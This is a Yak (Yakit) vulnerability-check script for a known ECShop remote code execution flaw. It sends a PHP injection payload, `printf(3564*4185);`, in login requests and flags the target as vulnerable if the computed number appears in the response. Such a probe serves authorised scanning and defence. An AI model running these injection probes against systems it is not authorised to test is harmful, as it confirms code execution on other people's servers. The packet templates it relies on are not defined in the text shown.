//漏洞检测规则函数 
rules = []
addRule = func(packet,payload, check , riskType, riskTypeVerbose, severity,reference,vul_res) {
    rules = append(rules, {
        "packet": packet,
        "payload": payload,
        "check": check,
        "type": riskType,
        "typeVerbose": riskTypeVerbose,
        "severity": severity,
        "reference":reference,
        "vul_res":vul_res,
    })
}


//填充对应的漏洞检测规则

addRule(PacketPoc3,`action=login&pp123=printf(3564*4185);`,func(rsp,header,body){
    if rsp.StatusCode == 200 && str.MatchAllOfSubString(body, `14915340`){
        return true
    }
    return false
},"RCE","ecshop-rce","high","https://github.com/vulhub/vulhub/blob/master/ecshop/xianzhi-2017-02-82239600/README.zh-cn.md","ecshop_xianzhi_2017_02_82239600_poc_res")

addRule(PacketPoc4,`action=login&pp123=printf(3564*4185);`,func(rsp,header,body){
    if rsp.StatusCode == 200 && str.MatchAllOfSubString(body, `14915340`){
        return true
    }
    return false
},"RCE","ecshop-rce","high","https://github.com/vulhub/vulhub/blob/master/ecshop/xianzhi-2017-02-82239600/README.zh-cn.md","ecshop_xianzhi_2017_02_82239600_poc_res")



//漏洞检测handle 
handleRule = func(swg, isTls, addr, rule) {
    swg.Add()
    go func{
        defer swg.Done()

        defer func{
            recover()
        }

        resp, req, err = poc.HTTP(rule["packet"], poc.https(isTls), poc.params({"target": addr, "payload": rule.payload}),poc.redirectTimes(0))
        if err != nil {
            yakit.Error("poc.HTTP error: %v", err)
            return
        }
        header, body = poc.Split(resp)
        rspIns, _ = poc.ParseBytesToHTTPResponse(resp)
        urlIns, _ = str.ExtractURLFromHTTPRequestRaw(req, isTls)
        url = urlIns.String()
        if rule.check(rspIns, header, body) {
            yakit.Info("FOUND INFO for %v", rule.typeVerbose)
            risk.NewRisk(
                url, risk.severity(rule.severity), 
                risk.title(sprintf("FOUND %v", rule.typeVerbose)),
                risk.titleVerbose(sprintf("reference %v", rule.reference)),
                risk.type(rule.type), risk.typeVerbose(rule.typeVerbose),
                risk.payload(rule.payload), 
                risk.request(req),
                risk.response(resp),
                risk.details({
                    "url": url,
                    f"${rule.vul_res}":true,
                }),
            )
            return
        }
        return
    }
}




root_url=cli.String("root_url")


main=func(){
    ip, port, err = str.ParseStringToHostPort(root_url)
    if err != nil {
        die(err)
    }
    // poc(ip, port)
    addr=str.HostPort(ip, port)
    isTls=str.IsTLSServer(addr)    


    swg = sync.NewSizedWaitGroup(10)
    for _, rule = range rules {
        handleRule(swg, isTls, addr, rule)
    }
    swg.Wait()

}

main()
